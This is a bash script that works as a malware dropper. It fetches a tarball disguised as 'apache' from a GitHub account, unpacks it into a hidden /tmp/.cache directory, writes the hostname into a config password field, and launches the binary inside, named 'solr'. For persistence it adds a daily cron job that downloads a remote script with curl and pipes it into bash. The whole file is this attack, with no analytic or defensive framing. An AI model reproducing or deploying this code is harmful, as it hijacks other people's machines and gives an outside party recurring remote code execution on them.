#!/bin/bash
if pgrep -x "solr" > /dev/null; then
    exit 0
fi

# p=$(pwd)
p="/tmp"
config_file="config.json"

random_number=$(shuf -i 10000000-99999999 -n 1)
ho=$(hostname)
if [ ${#ho} -lt 1 ]; then
    ho=$random_number
fi

ROOT_path="$p/.cache"
apachee_url="https://github.com/lazy12121212/server/raw/main/apache.tar.gz"
command=""
existing_crontab=$(crontab -l 2>/dev/null)

if [ ! -d "$ROOT_path" ]; then
    mkdir -p "$ROOT_path"
fi

cd "$ROOT_path" || handle_error "Unable to switch to directory: $ROOT_path !!!"

wget --no-check-certificate -O "apachee.tar.gz" "$apachee_url"
if [ -f "apachee.tar.gz" ];then
    echo "Wget apachee downloaded successfully"
else
    echo "Wget apachee download failed, try curl apachee"
    curl -Lk "$apachee_url" -o "apachee.tar.gz"
    if [ -f "apachee.tar.gz" ];then
        echo "curl apachee downloaded successfully"
    else
        echo "curl download failed"
   fi
fi

tar -xzf "apachee.tar.gz" -C "$ROOT_path"

chmod 777 "$ROOT_path/solr"

if [ -f "$config_file" ]; then
    sed -i "s/\"pass\": \"random\"/\"pass\": \"$ho\"/g" "$config_file"
    echo "Updated pass field in $config_file with hostname: $ho"
else
    echo "Config file $config_file not found"
fi

rm -rf apachee.tar.gz

com="./solr"
start_sh="$ROOT_path/start.sh"
if [ -f "$start_sh" ]; then
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
else
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
fi

sleep 5

if crontab -l | grep "curl -sSfk https://raw.githubusercontent.com/lazy12121212/server/main/service.sh"; then
    echo "The specified scheduled task has been added !!!"
else
    (crontab -l 2>/dev/null; printf "0 1 * * *  mkdir -p $p;cd $p;curl -sSfk https://raw.githubusercontent.com/lazy12121212/server/main/service.sh | bash\n") | crontab -
    echo "The specified scheduled task has been added"
fi

